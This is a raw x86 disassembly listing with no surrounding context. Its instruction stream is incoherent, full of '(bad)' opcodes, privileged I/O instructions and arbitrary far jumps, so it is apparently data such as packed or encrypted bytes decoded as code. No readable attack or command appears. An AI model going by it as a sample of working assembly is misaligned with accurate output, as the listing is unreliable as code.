  40d371:	ret    0xf00c
  40d374:	jle    0x40d3c7
  40d376:	xchg   BYTE PTR [edi+ebp*2+0x624941cf],dl
  40d37d:	lods   al,BYTE PTR ds:[esi]
  40d37e:	or     cl,cl
  40d380:	add    ebp,ebp
  40d382:	inc    edi
  40d383:	xlat   BYTE PTR ds:[ebx]
  40d384:	js     0x40d350
  40d386:	popa   
  40d387:	mov    eax,0x15b62d4f
  40d38c:	repz add DWORD PTR [edx+0xa77b183],edi
  40d393:	arpl   ax,di
  40d395:	popf   
  40d396:	add    edi,DWORD PTR [edi-0x36]
  40d399:	mov    ss,WORD PTR [esi+edx*8]
  40d39c:	push   esp
  40d39d:	jmp    0x40d3ba
  40d39f:	inc    ebp
  40d3a0:	ror    BYTE PTR [ebx+0x13],0x1b
  40d3a4:	sub    ebx,0xc
  40d3a7:	stc    
  40d3a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3a9:	mov    ecx,0x9d19530e
  40d3ae:	in     eax,0x6b
  40d3b0:	xchg   ecx,eax
  40d3b1:	mov    dl,0x62
  40d3b3:	popa   
  40d3b4:	das    
  40d3b5:	mov    ah,0x27
  40d3b7:	mov    ch,0xed
  40d3b9:	sahf   
  40d3ba:	iret   
  40d3bb:	icebp  
  40d3bc:	and    cl,dl
  40d3be:	or     esi,esp
  40d3c0:	shl    cl,0x76
  40d3c3:	and    BYTE PTR [ebx],dl
  40d3c5:	data16 sub BYTE PTR [edx-0x8],cl
  40d3c9:	shl    DWORD PTR [esi+0x69d0fbaf],cl
  40d3cf:	xor    BYTE PTR [ebp+0x53],al
  40d3d2:	shr    BYTE PTR [eax-0x8],1
  40d3d5:	xor    ecx,0x836e5bcc
  40d3db:	arpl   WORD PTR [ebp-0x3bbc9e9d],dx
  40d3e1:	mov    BYTE PTR [ecx],al
  40d3e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3e4:	mov    eax,ds:0x226c880f
  40d3e9:	xlat   BYTE PTR ds:[ebx]
  40d3ea:	add    bx,WORD PTR [edi-0x7e4444b3]
  40d3f1:	ds (bad) 
  40d3f3:	and    DWORD PTR [ecx+eax*8+0x2c],eax
  40d3f7:	in     eax,dx
  40d3f8:	(bad)
  40d3fc:	sbb    cl,BYTE PTR [eax+ecx*1+0x50]
  40d400:	inc    ebp
  40d401:	xor    edi,ebx
  40d403:	jg     0x40d420
  40d405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d406:	ret    
  40d407:	shr    DWORD PTR [ecx-0x112896b2],0xcf
  40d40e:	xchg   BYTE PTR [edx+edx*8],ch
  40d411:	push   edi
  40d412:	shl    BYTE PTR [ecx+0x78a242cb],0xf9
  40d419:	and    ecx,DWORD PTR [esi]
  40d41b:	pop    ds
  40d41c:	ret    0xc1a4
  40d41f:	ficom  DWORD PTR [ebx+0x46]
  40d422:	lods   eax,DWORD PTR ds:[esi]
  40d423:	aad    0xca
  40d425:	jae    0x40d44f
  40d427:	in     eax,0xad
  40d429:	and    cl,al
  40d42b:	dec    esp
  40d42c:	xchg   edx,eax
  40d42d:	xor    DWORD PTR [edx+0x1cc46f51],esp
  40d433:	sti    
  40d434:	std    
  40d435:	in     eax,dx
  40d436:	and    eax,0xcea226be
  40d43b:	jge    0x40d485
  40d43d:	bound  ebp,QWORD PTR [edi+ebx*4]
  40d440:	fidivr WORD PTR [ebp-0x27b16ca2]
  40d446:	inc    ebx
  40d447:	ds es mov dl,0x31
  40d44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d44c:	dec    ebp
  40d44d:	pop    esp
  40d44e:	dec    esi
  40d44f:	mov    bl,0xe3
  40d451:	inc    ebx
  40d452:	mov    eax,ds:0x15650a6e
  40d457:	mov    ebp,0xd40c4036
  40d45c:	aam    0x2f
  40d45e:	hlt    
  40d45f:	inc    edi
  40d460:	fcom   st(7)
  40d462:	xor    al,0x42
  40d464:	rcl    BYTE PTR [eax+esi*2+0x1b],1
  40d468:	dec    ebp
  40d469:	and    al,dh
  40d46b:	fisttp WORD PTR [esi+0x2d1883bc]
  40d471:	dec    edx
  40d472:	aad    0x61
  40d474:	aam    0x44
  40d476:	aad    0x57
  40d478:	mov    al,ds:0xa63c8573
  40d47d:	sbb    DWORD PTR [ebp-0xa5e9b80],eax
  40d483:	pop    esp
  40d484:	jmp    0xb95b:0x5174b0f8
  40d48b:	mov    ch,0x9
  40d48d:	ja     0x40d488
  40d48f:	out    dx,eax
  40d490:	call   0x6f0c5676
  40d495:	mov    ecx,0xdf4628d
  40d49a:	push   ss
  40d49b:	mov    ds:0x44ac05ab,eax
  40d4a0:	jge    0x40d4e4
  40d4a2:	loop   0x40d45d
  40d4a4:	sahf   
  40d4a5:	xor    ah,BYTE PTR [ecx+0x639fe992]
  40d4ab:	mov    edi,0xcc228a13
  40d4b0:	(bad)  
  40d4b2:	sub    BYTE PTR [ebx-0x33],ch
  40d4b5:	xchg   edx,eax
  40d4b6:	jnp    0x40d4fe
  40d4b8:	cld    
  40d4b9:	dec    ebx
  40d4ba:	bnd jp 0x40d4b1
  40d4bd:	xor    al,0x95
  40d4bf:	cmp    ch,al
  40d4c1:	inc    eax
  40d4c2:	icebp  
  40d4c3:	loop   0x40d525
  40d4c5:	daa    
  40d4c6:	sbb    dh,ch
  40d4c8:	test   eax,0xcc8174f4
  40d4cd:	das    
  40d4ce:	mov    dl,0x3a
  40d4d0:	aam    0x97
  40d4d2:	sbb    eax,0x306223ea
  40d4d7:	jmp    0x40d483
  40d4d9:	lds    edx,FWORD PTR [esi+0x3]
  40d4dc:	gs cmc 
  40d4de:	int3   
  40d4df:	inc    esi
  40d4e0:	shl    DWORD PTR [eax+edx*8],0xc
  40d4e4:	in     eax,0x7a
  40d4e6:	push   0x3d88d237
  40d4eb:	xchg   edx,eax
  40d4ec:	lods   eax,DWORD PTR ds:[esi]
  40d4ed:	lahf   
  40d4ee:	or     BYTE PTR [edx+0x13eab963],dh
  40d4f4:	xor    BYTE PTR [ebp-0x5cf09a70],ch
  40d4fa:	aaa    
  40d4fb:	and    eax,DWORD PTR [ebx+esi*8+0x3636c4ac]
  40d502:	and    DWORD PTR [edi+ebp*2],0x53
  40d506:	jnp    0x40d50a
  40d508:	cmp    DWORD PTR [esi+0x3be7a9a5],0xd052935c
  40d512:	pop    esi
  40d513:	mov    edi,0xb8e8c054
  40d518:	sahf   
  40d519:	pop    ds
  40d51a:	adc    bl,BYTE PTR [ebx-0x6277c4a5]
  40d520:	mov    eax,ds:0x1b45767c
  40d525:	jmp    0xf8f0:0x999b6d2c
  40d52c:	pop    ebx
  40d52d:	nop
  40d52e:	or     DWORD PTR [ebx-0x2703bc6],edx
  40d534:	and    esi,esp
  40d536:	dec    ebx
  40d537:	test   ah,al
  40d539:	mov    ds:0x7800dc4b,eax
  40d53e:	mov    ah,BYTE PTR [ecx+esi*8]
  40d541:	jg     0x40d59e
  40d543:	scas   al,BYTE PTR es:[edi]
  40d544:	mov    esi,0xc0a8136
  40d549:	and    ah,BYTE PTR [edi+0x44]
  40d54c:	pop    esp
  40d54d:	aaa    
  40d54e:	push   ebx
  40d54f:	inc    ebx
  40d550:	sbb    eax,0xb7613145
  40d555:	aaa    
  40d556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d557:	fisttp QWORD PTR [eax-0x3b6a021]
  40d55d:	iret   
  40d55e:	mov    fs:0xcbc4ee46,al
  40d564:	mov    ch,0x5
  40d566:	shr    DWORD PTR [ebx+0x76],cl
  40d569:	sub    edi,DWORD PTR [ecx+0x7c]
  40d56c:	jl     0x40d5cf
  40d56e:	or     dh,BYTE PTR [ecx-0x54864161]
  40d574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d575:	or     bh,BYTE PTR [ecx+0x72c72806]
  40d57b:	fisub  WORD PTR [ebx+0x1c6943e8]
  40d581:	xchg   ebp,eax
  40d582:	ds in  al,0x8b
  40d585:	pop    ebp
  40d586:	aas    
  40d587:	mov    eax,DWORD PTR [edi+ebx*4+0x75]
  40d58b:	pop    ss
  40d58c:	inc    ebp
  40d58d:	mov    bh,0x7d
  40d58f:	inc    esi
  40d590:	sub    al,0x62
  40d592:	test   edx,esp
  40d594:	cmp    BYTE PTR [ebx-0x35a18542],dh
  40d59a:	mov    al,0xa9
  40d59c:	push   eax
  40d59d:	push   cs
  40d59e:	jg     0x40d529
  40d5a0:	jns    0x40d589
  40d5a2:	ins    DWORD PTR es:[edi],dx
  40d5a3:	and    eax,0xa18a2885
  40d5a8:	and    eax,edx
  40d5aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5ab:	xor    eax,0xa23f913d
  40d5b0:	rcr    esp,1
  40d5b2:	into   
  40d5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5b4:	ror    DWORD PTR [esi+ecx*1],cl
  40d5b7:	and    al,0xe4
  40d5b9:	mov    edi,0xb2cf1cde
  40d5be:	out    0x84,al
  40d5c0:	retf   0xeaba
  40d5c3:	or     eax,0x81db1f42
  40d5c8:	call   esp
  40d5ca:	call   0xf216d7aa
  40d5cf:	xor    cl,BYTE PTR [eax-0x4a]
  40d5d2:	fwait
  40d5d3:	sub    al,0x78
  40d5d5:	rcl    bh,cl
  40d5d7:	jne    0x40d5d8
  40d5d9:	mov    al,0x5d
  40d5db:	dec    ebp
  40d5dc:	sub    eax,0xdacc04a8
  40d5e1:	add    BYTE PTR [edx+0x3a7695b6],cl
  40d5e7:	pop    DWORD PTR [edx]
  40d5e9:	adc    BYTE PTR [eax],dh
  40d5eb:	mov    ?,WORD PTR [eax+ebp*4-0x38910ad9]
  40d5f2:	icebp  
  40d5f3:	std    
  40d5f4:	gs mov edx,0x87731656
  40d5fa:	jno    0x40d5cf
  40d5fc:	push   0xbbfb839
  40d601:	xchg   esi,eax
  40d602:	sbb    BYTE PTR [edx],ch
  40d604:	in     al,0xa9
  40d606:	iret   
  40d607:	inc    esp
  40d608:	jmp    0x40d5b5
  40d60a:	jl     0x40d676
  40d60c:	mov    esi,0x53a1dd18
  40d611:	pop    esp
  40d612:	xor    DWORD PTR [esi],esi
  40d614:	pop    DWORD PTR [ebx]
  40d616:	sub    esp,ebp
  40d618:	jmp    FWORD PTR [esi+0x5e]
  40d61b:	stc    
  40d61c:	adc    al,0x38
  40d61e:	dec    esi
  40d61f:	and    cl,BYTE PTR [ebx-0xf]
  40d622:	jl     0x40d5a5
  40d624:	jmp    FWORD PTR [esi+0x6739d8dc]
  40d62a:	xchg   BYTE PTR [ebx+0x6dd7c5b8],dh
  40d630:	fmul   st,st(2)
  40d632:	pop    ss
  40d633:	test   ebp,esp
  40d635:	fcomp  DWORD PTR [eax-0x598ce522]
  40d63b:	mov    esp,0x6d71389f
  40d640:	sub    ebx,DWORD PTR [edi-0x912cc92]
  40d646:	inc    esp
  40d647:	mov    DWORD PTR [ebp+0x71],ebp
  40d64a:	jge    0x40d65a
  40d64c:	inc    edx
  40d64d:	neg    BYTE PTR [ebx]
  40d64f:	gs sbb esi,esp
  40d652:	mov    ebp,0xa7d55b33
  40d657:	inc    esp
  40d658:	popf   
  40d659:	fwait
  40d65a:	mov    esi,0x749ea6b0
  40d65f:	sbb    al,0xf
  40d661:	js     0x40d5ef
  40d663:	and    eax,0x490f753c
  40d668:	push   edx
  40d669:	mov    es:0x1f5fd0e4,al
  40d66f:	aas    
  40d670:	jmp    0xf47b:0x1237ed5f
  40d677:	call   DWORD PTR [ecx+0x8f91955]
  40d67d:	fld    TBYTE PTR [eax+0xc]
  40d680:	icebp  
  40d681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d682:	mov    ebp,fs
  40d684:	mov    ch,0xd9
  40d686:	loopne 0x40d6d1
  40d688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d689:	hlt    
  40d68a:	pushf  
  40d68b:	xchg   BYTE PTR [ebx+0x2e],dh
  40d68e:	adc    esi,DWORD PTR [ecx-0x3b8a48e]
  40d694:	sub    dh,BYTE PTR [edx]
  40d696:	jecxz  0x40d664
  40d698:	sub    DWORD PTR [ecx+0x5],edi
  40d69b:	cmp    DWORD PTR [eax],edx
  40d69d:	sub    al,0x1c
  40d69f:	adc    al,0x77
  40d6a1:	push   cs
  40d6a2:	hlt    
  40d6a3:	fmul   QWORD PTR [esi+0x18]
  40d6a6:	aad    0xf3
  40d6a8:	xchg   edi,eax
  40d6a9:	mov    cl,0xb3
  40d6ab:	adc    DWORD PTR [eax-0x5c4b3869],ecx
  40d6b1:	into   
  40d6b2:	leave  
  40d6b3:	cmp    ebx,DWORD PTR [edx+0x1ed77807]
  40d6b9:	pop    eax
  40d6ba:	aas    
  40d6bb:	pushf  
  40d6bc:	ja     0x40d6d4
  40d6be:	int3   
  40d6bf:	xchg   edx,eax
  40d6c0:	sbb    eax,0x10e669ba
  40d6c5:	xchg   esp,eax
  40d6c6:	(bad)  
  40d6c7:	repnz shl DWORD PTR [ebx-0x62e1c18a],1
  40d6ce:	test   BYTE PTR [ecx-0x86d0ee5],0x1c
  40d6d5:	sbb    al,0xe1
  40d6d7:	xchg   ebx,eax
  40d6d8:	outs   dx,BYTE PTR cs:[esi]
  40d6da:	pop    eax
  40d6db:	cmp    al,BYTE PTR [esi+0x11754bee]
  40d6e1:	or     BYTE PTR [ecx+0xb2d50e5],dh
  40d6e7:	xchg   ebx,eax
  40d6e8:	loopne 0x40d6ac
  40d6ea:	ins    DWORD PTR es:[edi],dx
  40d6eb:	push   edi
  40d6ec:	push   eax
  40d6ed:	or     al,0xd0
  40d6ef:	add    DWORD PTR [eax+esi*8+0x31c88dd5],ecx
  40d6f6:	xor    eax,0xc9d4d73f
  40d6fb:	ror    DWORD PTR [edi-0x7b],0x79
  40d6ff:	mov    ah,0xf4
  40d701:	xor    eax,0xd342194c
  40d706:	gs dec ecx
  40d708:	jne    0x40d726
  40d70a:	fcomp  DWORD PTR [ebx+edx*8]
  40d70d:	and    ah,BYTE PTR [edi]
  40d70f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d710:	ja     0x40d697
  40d712:	sbb    bh,BYTE PTR [edi]
  40d714:	or     ch,BYTE PTR [eax+eiz*8+0x5]
  40d718:	fs in  eax,0x47
  40d71b:	and    al,0xa4
  40d71d:	fistp  QWORD PTR [edi]
  40d71f:	ja     0x40d743
  40d721:	aad    0x98
  40d723:	xchg   esi,eax
  40d724:	mov    esi,0x20d9f67d
  40d729:	addr16 mov ds:0x7884,eax
  40d72d:	dec    ebx
  40d72e:	push   edi
  40d72f:	mul    ah
  40d731:	lea    ebx,[edi]
  40d733:	cld    
  40d734:	loopne 0x40d7aa
  40d736:	push   ss
  40d737:	mov    ch,0x7e
  40d739:	cdq    
  40d73a:	or     eax,DWORD PTR [edi+0x3c]
  40d73d:	mov    ss,WORD PTR [ebx-0x54dfdc9b]
  40d743:	and    esp,edi
  40d745:	mov    al,ds:0xcf65d699
  40d74a:	std    
  40d74b:	(bad)  
  40d74c:	jl     0x40d6db
  40d74e:	outs   dx,BYTE PTR ds:[esi]
  40d74f:	(bad)  
  40d750:	call   0xaae02e21
  40d755:	jle    0x40d7af
  40d757:	and    BYTE PTR [esi],ch
  40d759:	sbb    BYTE PTR [ecx-0x45],bl
  40d75c:	mov    esp,0xbbf60be
  40d761:	mov    eax,ds:0xd7daaa1
  40d766:	mov    ch,0xba
  40d768:	or     ebx,DWORD PTR [edi-0x6e]
  40d76b:	inc    ebp
  40d76c:	arpl   WORD PTR [ebp-0x790dc836],bx
  40d772:	jnp    0x40d70b
  40d774:	pop    esp
  40d775:	ja     0x40d7b2
  40d777:	sbb    eax,0x34eb9d4b
  40d77c:	push   0xe457674d
  40d781:	push   esp
  40d782:	outs   dx,DWORD PTR ds:[esi]
  40d783:	js     0x40d7fe
  40d785:	adc    bh,dl
  40d787:	icebp  
  40d788:	popf   
  40d789:	jae    0x40d7e1
  40d78b:	fidiv  DWORD PTR [ebp-0x1a7e6d04]
  40d791:	mov    bl,0x7
  40d793:	jmp    0x6aec3e74
  40d798:	mov    al,ss:0xc2f4354e
  40d79e:	aam    0xfa
  40d7a0:	push   ebp
  40d7a1:	mov    ecx,0x7ef2e884
  40d7a6:	adc    eax,0x3911a077
  40d7ab:	xchg   ecx,eax
  40d7ac:	mov    ebx,0x9d17e5e7
  40d7b1:	mov    al,BYTE PTR [edx-0x2cb75b2a]
  40d7b7:	lock adc eax,0xe47c7321
  40d7bd:	inc    ecx
  40d7be:	into   
  40d7bf:	test   al,0xbb
  40d7c1:	rcr    DWORD PTR [ecx+0x39448c29],cl
  40d7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7c8:	iret   
  40d7c9:	fadd   QWORD PTR [edi]
  40d7cb:	pusha  
  40d7cc:	mov    edi,0x6ccfb6b9
  40d7d1:	inc    edx
  40d7d2:	push   ecx
  40d7d3:	add    BYTE PTR [edi],0xde
  40d7d6:	sub    eax,0x7ee973af
  40d7db:	jecxz  0x40d81e
  40d7dd:	inc    esi
  40d7de:	or     DWORD PTR [eax+0x31],0xffffffb6
  40d7e2:	jnp    0x40d810
  40d7e4:	dec    esp
  40d7e5:	outs   dx,BYTE PTR ds:[esi]
  40d7e6:	mov    BYTE PTR [ebx-0x64],al
  40d7e9:	jmp    0x40d7b7
  40d7eb:	mov    esi,0x398c3940
  40d7f0:	xor    DWORD PTR [edx+0x60],edx
  40d7f3:	push   ds
  40d7f4:	lds    edx,FWORD PTR [ecx]
  40d7f6:	ins    BYTE PTR es:[edi],dx
  40d7f7:	pushf  
  40d7f8:	xor    al,0x32
  40d7fa:	xor    ecx,edx
  40d7fc:	mov    ah,0xd3
  40d7fe:	popa   
  40d7ff:	jl     0x40d81d
  40d801:	push   edi
  40d802:	dec    eax
  40d803:	fs pop eax
  40d805:	test   edi,ecx
  40d807:	add    eax,DWORD PTR [esi-0x7a]
  40d80a:	js     0x40d7a1
  40d80c:	sub    al,0xdf
  40d80e:	adc    eax,DWORD PTR [eax-0x6f]
  40d811:	sub    dl,0xd0
  40d814:	push   ds
  40d815:	icebp  
  40d816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d817:	add    DWORD PTR [esi-0x33cbeab3],eax
  40d81d:	mov    BYTE PTR [edx],bl
  40d81f:	iret   
  40d820:	ret    
  40d821:	cmp    ecx,edi
  40d823:	adc    esp,DWORD PTR [esi+0x713cd65d]
  40d829:	adc    esp,DWORD PTR [edi+0x4a]
  40d82c:	pop    eax
  40d82d:	fs aad 0x73
  40d830:	dec    edi
  40d831:	mov    edx,DWORD PTR [ecx+0x1b756dfb]
  40d837:	and    eax,0xcee0459
  40d83c:	inc    esp
  40d83d:	fisub  DWORD PTR [ebp-0x62]
  40d840:	dec    ebx
  40d841:	ja     0x40d899
  40d843:	jmp    0xbb294f27
  40d848:	mov    eax,ds:0x42396813
  40d84d:	mov    WORD PTR [edx+ebx*1+0x3e],?
  40d851:	loop   0x40d80f
  40d853:	pop    eax
  40d854:	aam    0xaf
  40d856:	xor    al,0x99
  40d858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d859:	neg    DWORD PTR [edx-0x4fd4990e]
  40d85f:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d861:	dec    esi
  40d862:	xchg   ebp,eax
  40d863:	popa   
  40d864:	ror    ebp,1
  40d866:	fdivr  QWORD PTR [ebp-0x79]
  40d869:	sbb    ebx,DWORD PTR [esp+ecx*2]
  40d86c:	or     edx,DWORD PTR [ecx-0x271a73e1]
  40d872:	dec    edi
  40d873:	in     al,0x1b
  40d875:	add    DWORD PTR [ebp+0x6f6f1a35],ebp
  40d87b:	xchg   DWORD PTR [ecx+0x33a312a2],ebp
  40d881:	out    dx,al
  40d882:	fdivrp st(0),st
  40d884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d885:	inc    ecx
  40d886:	push   0xffffff88
  40d888:	sbb    ch,BYTE PTR [ebx-0x5b57cb00]
  40d88e:	mov    edx,0xa56a9292
  40d893:	pop    esi
  40d894:	sub    ch,ah
  40d896:	call   0x7fc3:0x804c581
  40d89d:	inc    edx
  40d89e:	cdq    
  40d89f:	lea    edx,[ecx+ebx*4-0x26]
  40d8a3:	jle    0x40d835
  40d8a5:	xor    DWORD PTR [edi+0x825b78f],esi
  40d8ab:	(bad)  
  40d8ac:	lods   al,BYTE PTR es:[esi]
  40d8ae:	scas   eax,DWORD PTR es:[edi]
  40d8af:	jge    0x40d888
  40d8b1:	dec    ecx
  40d8b2:	push   ss
  40d8b3:	cmp    BYTE PTR [ebx-0x6e],dl
  40d8b6:	inc    ebp
  40d8b7:	je     0x40d83f
  40d8b9:	in     al,dx
  40d8ba:	xor    DWORD PTR [eax-0x6c7c8ea9],eax
  40d8c0:	xlat   BYTE PTR ds:[ebx]
  40d8c1:	cmp    BYTE PTR [eax],0xf7
  40d8c4:	ror    DWORD PTR [edi],1
  40d8c6:	adc    eax,0xdb783dd2
  40d8cb:	or     ebx,DWORD PTR [ebx]
  40d8cd:	ficomp WORD PTR [ecx-0x58c5715f]
  40d8d3:	repz add edi,DWORD PTR [esi+0x5c978e96]
  40d8da:	or     DWORD PTR [edi+0x21],esp
  40d8dd:	jo     0x40d925
  40d8df:	inc    edx
  40d8e0:	ficom  DWORD PTR [edx-0x4]
  40d8e3:	inc    ebx
  40d8e4:	idiv   BYTE PTR [esi+0x24]
  40d8e7:	retf   
  40d8e8:	leave  
  40d8e9:	and    ebp,DWORD PTR [edi-0x3]
  40d8ec:	sbb    esi,DWORD PTR [esi-0x6]
  40d8ef:	retf   0x719
  40d8f2:	and    BYTE PTR [eax],0x7c
  40d8f5:	shl    DWORD PTR [edi+0x5a5d54a8],1
  40d8fb:	push   eax
  40d8fc:	push   cs
  40d8fd:	xchg   esp,esi
  40d8ff:	jmp    0x86e:0x712bd6fb
  40d906:	loop   0x40d970
  40d908:	stos   DWORD PTR es:[di],eax
  40d90a:	and    DWORD PTR [ebp+0x63],ecx
  40d90d:	jecxz  0x40d8a3
  40d90f:	adc    al,BYTE PTR [eax]
  40d911:	mov    ecx,0xbd74b17e
  40d916:	push   ebx
  40d917:	sub    eax,0xe4cae349
  40d91c:	(bad)  
  40d91d:	call   0xc633907c
  40d922:	push   ebx
  40d923:	mov    ecx,DWORD PTR [ebp+0x76e5b768]
  40d929:	xchg   edi,eax
  40d92a:	out    dx,eax
  40d92b:	xchg   BYTE PTR ds:0x468e5ee1,ch
  40d931:	dec    esi
  40d932:	and    DWORD PTR ds:0x92d18122,esi
  40d938:	mov    esp,0x3cd4d22f
  40d93d:	and    BYTE PTR [ebx+edi*2-0x3e0b8309],cl
  40d944:	aas    
  40d945:	out    0xee,al
  40d947:	test   al,0x15
  40d949:	ficom  DWORD PTR [ecx]
  40d94b:	jmp    0xc69ca7f3
  40d950:	lods   al,BYTE PTR ds:[esi]
  40d951:	dec    esp
  40d952:	jge    0x40d9b7
  40d954:	scas   al,BYTE PTR es:[edi]
  40d955:	out    0xa4,al
  40d957:	xchg   esi,eax
  40d958:	out    0xf1,al
  40d95a:	mov    ds:0x67825db5,eax
  40d95f:	into   
  40d960:	aas    
  40d961:	rcl    BYTE PTR fs:[esi],cl
  40d964:	xor    ebx,0xe76e6e4a
  40d96a:	and    eax,0x480a3a56
  40d96f:	jae    0x40d93e
  40d971:	jle    0x40d9cc
  40d973:	sahf   
  40d974:	xor    bl,cl
  40d976:	jne    0x40d909
  40d978:	icebp  
  40d979:	into   
  40d97a:	les    eax,FWORD PTR [esi+ebp*8+0x6c]
  40d97e:	ins    DWORD PTR es:[edi],dx
  40d97f:	and    cl,BYTE PTR [ecx+0x37]
  40d982:	enter  0xcefc,0x9a
  40d986:	mov    eax,ds:0xb6f1fa62
  40d98b:	cld    
  40d98c:	mov    ebp,0x69436418
  40d991:	loopne 0x40da11
  40d993:	inc    edx
  40d994:	ins    BYTE PTR es:[edi],dx
  40d995:	xchg   DWORD PTR gs:[ecx-0x67794b21],eax
  40d99c:	dec    edi
  40d99d:	cdq    
  40d99e:	and    bl,BYTE PTR [ebx]
  40d9a0:	xor    DWORD PTR [ebx-0x244da24e],eax
  40d9a6:	sub    dl,BYTE PTR [edx+0x3938f5a5]
  40d9ac:	stos   BYTE PTR es:[edi],al
  40d9ad:	inc    edi
  40d9ae:	or     BYTE PTR [edi-0x68],0xa1
  40d9b2:	xor    ebx,DWORD PTR [eax+0x71bad223]
  40d9b8:	xchg   esp,eax
  40d9b9:	lahf   
  40d9ba:	enter  0xdd3f,0x20
  40d9be:	pop    ss
  40d9bf:	bswap  edx
  40d9c1:	mov    fs,WORD PTR [edi+esi*8]
  40d9c4:	cmp    al,BYTE PTR [edi-0xeb54d3b]
  40d9ca:	push   esp
  40d9cb:	mov    ah,0xb4
  40d9cd:	enter  0xee9d,0x75
  40d9d1:	test   ebx,ebx
  40d9d3:	jl     0x40da22
  40d9d5:	test   BYTE PTR [ebx],bl
  40d9d7:	inc    ebx
  40d9d8:	cli    
  40d9d9:	mov    WORD PTR ds:0x8c8b418e,?
  40d9df:	loope  0x40d963
  40d9e1:	int3   
  40d9e2:	hlt    
  40d9e3:	sbb    DWORD PTR [esi-0x50df346],edi
  40d9e9:	jne    0x40d99d
  40d9eb:	leave  
  40d9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9ed:	js     0x40da08
  40d9ef:	(bad)
  40d9f2:	imul   esp,DWORD PTR [esi+0x5e],0x841de03a
  40d9f9:	pop    ds
  40d9fa:	mov    ebp,0x9db432a3
  40d9ff:	adc    BYTE PTR [ebp+edx*2+0x40d615b],0xc2
  40da07:	repnz repnz hlt 
  40da0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da0b:	dec    eax
  40da0c:	std    
  40da0d:	jno    0x40d9c8
  40da0f:	scas   al,BYTE PTR es:[edi]
  40da10:	hlt    
  40da11:	pop    ebp
  40da12:	cmp    DWORD PTR [ebx],eax
  40da14:	mov    ch,0x1c
  40da16:	iret   
  40da17:	ret    0x7683
  40da1a:	fisttp WORD PTR [eax+0x31ba363b]
  40da20:	xchg   edx,eax
  40da21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da22:	shr    DWORD PTR [esi+0x50],1
  40da25:	add    al,0x29
  40da27:	in     al,0x5b
  40da29:	add    al,0xb8
  40da2b:	pop    ebp
  40da2c:	fcmovne st,st(1)
  40da2e:	(bad)  
  40da2f:	adc    edx,DWORD PTR [ebp+0x67]
  40da32:	pushf  
  40da33:	icebp  
  40da34:	int    0x4b
  40da36:	fwait
  40da37:	mov    ebp,0xc55b83a7
  40da3c:	jb     0x40da46
  40da3e:	sbb    al,0x41
  40da40:	fild   WORD PTR [esi+0x20b517f1]
  40da46:	mov    ecx,0x9336d006
  40da4b:	push   ebp
  40da4c:	shld   DWORD PTR [edx-0x63],esp,cl
  40da50:	add    eax,0x4f5beb99
  40da55:	xor    eax,0xc47660fc
  40da5a:	fdiv   st,st(0)
  40da5c:	stos   DWORD PTR es:[edi],eax
  40da5d:	(bad)  
  40da5e:	pop    ebp
  40da5f:	jge    0x40da06
  40da61:	xchg   edx,eax
  40da62:	fidivr WORD PTR [eax-0x31ef444e]
  40da68:	aam    0xf5
  40da6a:	fcom   DWORD PTR [edx]
  40da6c:	sub    eax,0x9511f933
  40da71:	cmp    eax,0xc1e70688
  40da76:	push   edi
  40da77:	int3   
  40da78:	pop    ebp
  40da79:	mov    ah,0xca
  40da7b:	out    dx,al
  40da7c:	xor    eax,0xbecb5208
  40da81:	sbb    al,0x35
  40da83:	xchg   ebp,eax
  40da84:	sub    bh,BYTE PTR [edx-0x3]
  40da87:	bound  esp,QWORD PTR [ecx+0x40]
  40da8a:	aad    0x8
  40da8c:	mov    esi,ecx
  40da8e:	or     ecx,0x2
  40da91:	jbe    0x40dac1
  40da93:	mov    ds:0x5954c7dc,eax
  40da98:	jbe    0x40daea
  40da9a:	out    0x63,al
  40da9c:	scas   eax,DWORD PTR es:[edi]
  40da9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da9e:	outs   dx,BYTE PTR ds:[esi]
  40da9f:	test   ecx,edi
  40daa1:	outs   dx,DWORD PTR ds:[esi]
  40daa2:	push   0xff8301a
  40daa7:	leave  
  40daa8:	and    al,0xf6
  40daaa:	fistp  QWORD PTR [esp+ebx*2]
  40daad:	xor    BYTE PTR [ebp-0x57ced47e],cl
  40dab3:	cli    
  40dab4:	in     eax,dx
  40dab5:	mov    bl,0x6b
  40dab7:	ret    0x87ed
  40daba:	push   0x22774a6b
  40dabf:	sbb    al,0x24
  40dac1:	sub    al,0x57
  40dac3:	and    al,0x16
  40dac5:	pusha  
  40dac6:	sbb    al,BYTE PTR [edx]
  40dac8:	(bad)  
  40dac9:	dec    BYTE PTR [edi+0x35f83bc4]
  40dacf:	cmp    ecx,DWORD PTR [ecx]
  40dad1:	adc    eax,DWORD PTR [ebx]
  40dad3:	mov    esp,0xc36ca062
  40dad8:	(bad)  
  40dad9:	int3   
  40dada:	ds mov bl,0xf
  40dadd:	wrmsr  
  40dadf:	pop    eax
  40dae0:	mov    esi,0xd88ed007
  40dae5:	adc    eax,ecx
  40dae7:	push   esi
  40dae8:	dec    eax
  40dae9:	pop    ecx
  40daea:	leave  
  40daeb:	or     esp,edx
  40daed:	or     BYTE PTR [esi-0x56],ah
  40daf0:	add    ah,BYTE PTR [ebx+eiz*4+0x5c]
  40daf4:	mov    eax,0x333d5d46
  40daf9:	(bad)  
  40dafa:	cmc    
  40dafb:	pop    ecx
